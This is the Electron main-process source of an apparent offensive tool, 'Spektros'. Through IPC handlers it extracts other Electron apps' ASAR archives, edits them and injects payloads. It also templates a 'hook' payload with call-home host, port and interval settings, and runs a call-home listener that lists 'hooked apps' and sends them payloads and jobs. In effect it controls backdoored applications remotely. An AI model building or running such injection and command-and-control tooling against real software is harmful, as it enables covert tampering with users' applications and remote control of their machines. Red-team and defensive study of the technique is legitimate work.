import { app, shell, BrowserWindow, ipcMain, dialog, session } from 'electron'
import { join } from 'path'
import { electronApp, optimizer, is } from '@electron-toolkit/utils'
import { 
  extractAsarToTmp, 
  getFileContent, 
  getFileTree, 
  saveFileContent, 
  searchFiles, 
  replaceInFiles 
} from './analysis'
import { initializePayloads, getPayloadsPath } from './startup'
import { 
  setupInjection,  // NEW: Import the setup function
  injectPayload,
  createPayload,
  listPayloads,
  listBackups,
  restoreBackup,
  deleteBackup,
  startCallHomeListener,
  stopCallHomeListener,
  sendPayload,
  getPayloadStatus,
  getHookedApps
} from './inject'
import icon from '../../resources/icon.png?asset'
import { promises as fs } from 'fs'
import { templatePayload } from '../renderer/src/components/injector/Payloads'
import hook from '../renderer/src/components/injector/Hook'

// Import theme management
import './theme'

// Clear all cookies and localStorage
async function clearBrowserData() {
  try {
    console.log('🧹 Clearing browser data...');
    
    // Clear cookies
    await session.defaultSession.clearStorageData({
      storages: ['cookies', 'localstorage', 'sessionstorage', 'indexdb', 'websql', 'shadercache', 'serviceworkers', 'cachestorage']
    });
    
    console.log('✅ Browser data cleared successfully');
  } catch (error) {
    console.error('❌ Failed to clear browser data:', error);
  }
}

function createWindow() {
  const mainWindow = new BrowserWindow({
    width: 1280,
    height: 720,
    show: false,
    autoHideMenuBar: true,
    ...(process.platform === 'linux' ? { icon } : {}),
    webPreferences: {
      preload: join(__dirname, '../preload/index.js'),
      sandbox: false,
      contextIsolation: true,
      nodeIntegration: false
    }
  })

  mainWindow.on('ready-to-show', () => {
    mainWindow.show()
  })

  mainWindow.webContents.setWindowOpenHandler((details) => {
    shell.openExternal(details.url)
    return { action: 'deny' }
  })

  if (is.dev && process.env['ELECTRON_RENDERER_URL']) {
    mainWindow.loadURL(process.env['ELECTRON_RENDERER_URL'])
  } else {
    mainWindow.loadFile(join(__dirname, '../renderer/index.html'))
  }
}

app.whenReady().then(async () => {
  // Clear browser data before initializing the app
  await clearBrowserData();
  
  electronApp.setAppUserModelId('com.spektros')

  // Initialize payloads directory
  try {
    await initializePayloads();
  } catch (error) {
    console.error('❌ Failed to initialize payloads:', error);
    // Continue - app can function without payloads
  }

  app.on('browser-window-created', (_, window) => {
    optimizer.watchWindowShortcuts(window)
  })

  // NEW: Injection Setup IPC Handler
  ipcMain.handle('inject:setup', async (event, asarPath) => {
    try {
      console.log(`🚀 Setting up injection for: ${asarPath}`)
      const result = await setupInjection(asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Injection setup failed:', error)
      return { success: false, error: error.message }
    }
  })

  // ASAR Analysis IPC Handlers
  ipcMain.handle('analysis:extract', async (event, asarPath) => {
    try {
      console.log(`🔄 Extracting ASAR: ${asarPath}`)
      const result = await extractAsarToTmp(asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Extract failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('analysis:getFileContent', async (event, filePath) => {
    try {
      console.log(`📖 Reading file: ${filePath}`)
      const content = await getFileContent(filePath)
      return { success: true, content }
    } catch (error) {
      console.error('Read file failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('analysis:getFileTree', async (event, tmpDir) => {
    try {
      console.log(`🌳 Getting file tree: ${tmpDir}`)
      const tree = await getFileTree(tmpDir)
      return { success: true, tree }
    } catch (error) {
      console.error('Get file tree failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('analysis:saveFile', async (event, filePath, content) => {
    try {
      console.log(`💾 Saving file: ${filePath}`)
      await saveFileContent(filePath, content)
      return { success: true }
    } catch (error) {
      console.error('Save file failed:', error)
      return { success: false, error: error.message }
    }
  })

  // Search IPC Handlers
  ipcMain.handle('analysis:search', async (event, tmpDir, searchQuery, options) => {
    try {
      console.log(`🔍 Searching in: ${tmpDir} for: "${searchQuery}"`)
      const results = await searchFiles(tmpDir, searchQuery, options)
      console.log(`✅ Search completed: ${results.totalMatches} matches in ${results.fileCount} files (${results.searchTime}ms)`)
      return { success: true, ...results }
    } catch (error) {
      console.error('Search failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('analysis:replace', async (event, tmpDir, searchQuery, replaceText, options, targetFiles) => {
    try {
      console.log(`🔄 Replacing "${searchQuery}" with "${replaceText}" in: ${tmpDir}`)
      const results = await replaceInFiles(tmpDir, searchQuery, replaceText, options, targetFiles)
      console.log(`✅ Replace completed: ${results.totalReplacements} replacements in ${results.filesModified} files`)
      return { success: true, ...results }
    } catch (error) {
      console.error('Replace failed:', error)
      return { success: false, error: error.message }
    }
  })

  // Directory Management IPC Handlers
  ipcMain.handle('app:getPayloadsPath', async () => {
    try {
      return { success: true, path: getPayloadsPath() };
    } catch (error) {
      return { success: false, error: error.message };
    }
  })

  ipcMain.handle('app:openPayloadsFolder', async () => {
    try {
      const payloadsPath = getPayloadsPath();
      await shell.openPath(payloadsPath);
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  })

  // Injection IPC Handlers
  ipcMain.handle('inject:payload', async (event, payloadPath, asarPath) => {
    try {
      console.log(`💉 Injecting payload: ${payloadPath} -> ${asarPath}`)
      const result = await injectPayload(payloadPath, asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Payload injection failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:createPayload', async (event, name, content, category) => {
    try {
      console.log(`📝 Creating payload: ${name}`)
      const result = await createPayload(name, content, category)
      return { success: true, ...result }
    } catch (error) {
      console.error('Payload creation failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:listPayloads', async () => {
    try {
      const result = await listPayloads()
      return { success: true, ...result }
    } catch (error) {
      console.error('List payloads failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:listBackups', async (event, asarPath) => {
    try {
      const result = await listBackups(asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('List backups failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:restoreBackup', async (event, backupPath, asarPath) => {
    try {
      console.log(`🔄 Restoring backup: ${backupPath} -> ${asarPath}`)
      const result = await restoreBackup(backupPath, asarPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Backup restore failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:deleteBackup', async (event, backupPath) => {
    try {
      console.log(`🗑️  Deleting backup: ${backupPath}`)
      const result = await deleteBackup(backupPath)
      return { success: true, ...result }
    } catch (error) {
      console.error('Backup deletion failed:', error)
      return { success: false, error: error.message }
    }
  })

  // Start call-home listener
  try {
    await startCallHomeListener();
  } catch (error) {
    console.error('Failed to start call-home listener:', error);
  }

  // Call-home IPC Handlers
  ipcMain.handle('inject:startListener', async () => {
    try {
      await startCallHomeListener();
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('inject:stopListener', async () => {
    try {
      await stopCallHomeListener();
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('inject:getHookedApps', async () => {
    try {
      const apps = await getHookedApps();
      return { success: true, apps };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('inject:sendPayload', async (event, appPort, payload, options) => {
    try {
      const result = await sendPayload(appPort, payload, options);
      return { success: true, ...result };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('inject:getPayloadStatus', async (event, appPort, jobId) => {
    try {
      const status = await getPayloadStatus(appPort, jobId);
      return { success: true, ...status };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  // File Dialog IPC Handlers
  ipcMain.handle('file-dialog:get-path', async (event, options = {}) => {
    try {
      const defaultOptions = {
        properties: ['openFile'],
        filters: [
          { name: 'ASAR Files', extensions: ['asar'] },
          { name: 'AppImage Files', extensions: ['AppImage', 'appimage'] },
          { name: 'All Files', extensions: ['*'] }
        ]
      }
      
      console.log('🔄 Opening file dialog with options:', { ...defaultOptions, ...options });
      
      // Use a separate process for file dialog to avoid mounting issues
      const { spawn } = require('child_process');
      const path = require('path');
      const os = require('os');
      const fs = require('fs');
      
      // Create a temporary script that will handle the file dialog
      const dialogScript = `
        const { app, dialog } = require('electron');
        
        app.whenReady().then(async () => {
          try {
            const result = await dialog.showOpenDialog({
              properties: ['openFile'],
              filters: [
                { name: 'ASAR Files', extensions: ['asar'] },
                { name: 'AppImage Files', extensions: ['AppImage', 'appimage'] },
                { name: 'All Files', extensions: ['*'] }
              ]
            });
            
            if (result.canceled) {
              console.log('DIALOG_RESULT:CANCELED');
            } else {
              console.log('DIALOG_RESULT:' + result.filePaths[0]);
            }
            
            // Immediately exit to release file handles
            process.exit(0);
          } catch (error) {
            console.log('DIALOG_ERROR:' + error.message);
            process.exit(1);
          }
        });
        
        // Force exit after 30 seconds to prevent hanging
        setTimeout(() => {
          console.log('DIALOG_ERROR:Timeout');
          process.exit(1);
        }, 30000);
      `;
      
      // Write the script to a temporary file
      const tempScriptPath = path.join(os.tmpdir(), `dialog-${Date.now()}.js`);
      fs.writeFileSync(tempScriptPath, dialogScript);
      
      console.log('📄 Created temporary dialog script:', tempScriptPath);
      
      // Spawn the separate electron process
      const dialogProcess = spawn(process.execPath, [tempScriptPath], {
        stdio: 'pipe',
        detached: false
      });
      
      let dialogOutput = '';
      let dialogError = '';
      
      dialogProcess.stdout.on('data', (data) => {
        dialogOutput += data.toString();
      });
      
      dialogProcess.stderr.on('data', (data) => {
        dialogError += data.toString();
      });
      
      // Wait for the dialog process to complete
      const dialogResult = await new Promise((resolve, reject) => {
        dialogProcess.on('close', (code) => {
          console.log(`🔄 Dialog process exited with code: ${code}`);
          console.log(`📋 Dialog output: ${dialogOutput}`);
          
          if (dialogError) {
            console.log(`⚠️  Dialog stderr: ${dialogError}`);
          }
          
          // Parse the result from stdout
          const lines = dialogOutput.split('\n');
          for (const line of lines) {
            if (line.startsWith('DIALOG_RESULT:')) {
              const result = line.substring('DIALOG_RESULT:'.length);
              if (result === 'CANCELED') {
                resolve({ canceled: true });
              } else {
                resolve({ filePath: result });
              }
              return;
            } else if (line.startsWith('DIALOG_ERROR:')) {
              const error = line.substring('DIALOG_ERROR:'.length);
              reject(new Error(error));
              return;
            }
          }
          
          // If no clear result found
          if (code === 0) {
            resolve({ canceled: true });
          } else {
            reject(new Error(`Dialog process failed with code ${code}`));
          }
        });
        
        dialogProcess.on('error', (error) => {
          console.error('❌ Dialog process error:', error);
          reject(error);
        });
        
        // Kill process after timeout
        setTimeout(() => {
          if (!dialogProcess.killed) {
            console.log('⏱️  Dialog process timeout, killing...');
            dialogProcess.kill('SIGKILL');
            reject(new Error('Dialog process timeout'));
          }
        }, 35000);
      });
      
      // Clean up temporary script
      try {
        fs.unlinkSync(tempScriptPath);
        console.log('🗑️  Cleaned up temporary script');
      } catch (cleanupError) {
        console.warn('⚠️  Could not cleanup temp script:', cleanupError.message);
      }
      
      // Force kill any remaining dialog processes (nuclear option)
      try {
        dialogProcess.kill('SIGKILL');
        console.log('💀 Force killed dialog process to ensure file release');
      } catch (killError) {
        // Process might already be dead
        console.log('💀 Dialog process already terminated');
      }
      
      if (dialogResult.canceled) {
        return { success: false, canceled: true };
      }
      
      const selectedPath = dialogResult.filePath;
      console.log('✅ Selected file path via separate process:', selectedPath);
      
      // Add additional delay to ensure file handles are released
      console.log('⏱️  Waiting for file handles to be fully released...');
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Verify the file is accessible and not mounted
      if (!fs.existsSync(selectedPath)) {
        console.error('❌ Selected file does not exist:', selectedPath);
        return { success: false, error: `Selected file does not exist: ${selectedPath}` };
      }
      
      if (selectedPath.endsWith('.asar')) {
        const stats = fs.statSync(selectedPath);
        console.log(`📊 ASAR file stats after separate process: ${stats.size} bytes, isFile: ${stats.isFile()}, isDirectory: ${stats.isDirectory()}`);
        
        if (stats.isDirectory() || stats.size === 0) {
          console.log('⚠️  ASAR still appears mounted even after separate process');
          // Return the path anyway - let the injection logic handle it
        } else {
          console.log('✅ ASAR appears properly unmounted via separate process');
        }
      }
      
      console.log('✅ File dialog completed via separate process');
      return { success: true, filePath: selectedPath };
      
    } catch (error) {
      console.error('❌ Separate process file dialog failed:', error);
      
      // Fallback to regular dialog if separate process fails
      console.log('🔄 Falling back to regular dialog...');
      
      try {
        const result = await dialog.showOpenDialog({
          properties: ['openFile'],
          filters: [
            { name: 'ASAR Files', extensions: ['asar'] },
            { name: 'AppImage Files', extensions: ['AppImage', 'appimage'] },
            { name: 'All Files', extensions: ['*'] }
          ]
        });
        
        if (result.canceled) {
          return { success: false, canceled: true };
        }
        
        return { success: true, filePath: result.filePaths[0] };
      } catch (fallbackError) {
        console.error('❌ Fallback dialog also failed:', fallbackError);
        return { success: false, error: fallbackError.message };
      }
    }
  });

  ipcMain.handle('file-dialog:save', async (event, options = {}) => {
    try {
      const defaultOptions = {
        filters: [
          { name: 'All Files', extensions: ['*'] }
        ]
      }
      
      const result = await dialog.showSaveDialog({
        ...defaultOptions,
        ...options
      })
      
      if (result.canceled) {
        return { success: false, canceled: true }
      }
      
      return { success: true, filePath: result.filePath }
    } catch (error) {
      console.error('Save dialog failed:', error)
      return { success: false, error: error.message }
    }
  })

  ipcMain.handle('inject:hook', async (event, config) => {
    try {
      // Use Electron's userData path for appDir
      const appDir = app.getPath('userData');
      const tmpDir = join(appDir, 'tmp');
      await fs.mkdir(tmpDir, { recursive: true });
      const payloadPath = join(tmpDir, 'hook.js');

      // Fill in defaults for config
      const {
        asarPath,
        uuid,
        debugPort = 10100,
        debugHost = '127.0.0.1',
        callHomeHost = '127.0.0.1',
        callHomePort = 5666,
        callHomeInterval = 60000,
        jobTimeout = 10000,
        enableCallHome = true
      } = config;

      if (!asarPath || !uuid) {
        throw new Error('asarPath and uuid are required');
      }

      // Prepare variables for templating
      const templateVars = {
        APP_UUID: uuid,
        DEBUG_PORT: debugPort,
        DEBUG_HOST: debugHost,
        CALL_HOME_HOST: callHomeHost,
        CALL_HOME_PORT: callHomePort,
        CALL_HOME_INTERVAL: callHomeInterval,
        JOB_TIMEOUT: jobTimeout,
        ENABLE_CALL_HOME: enableCallHome ? 'true' : 'false'
      };

      // Template the payload
      const templatedPayload = templatePayload(hook.code, templateVars);
      await fs.writeFile(payloadPath, templatedPayload, 'utf8');

      // Inject the payload into the ASAR
      const result = await injectPayload(payloadPath, asarPath);
      return { success: true, ...result, payloadPath };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  createWindow()

  app.on('activate', function () {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit()
  }
})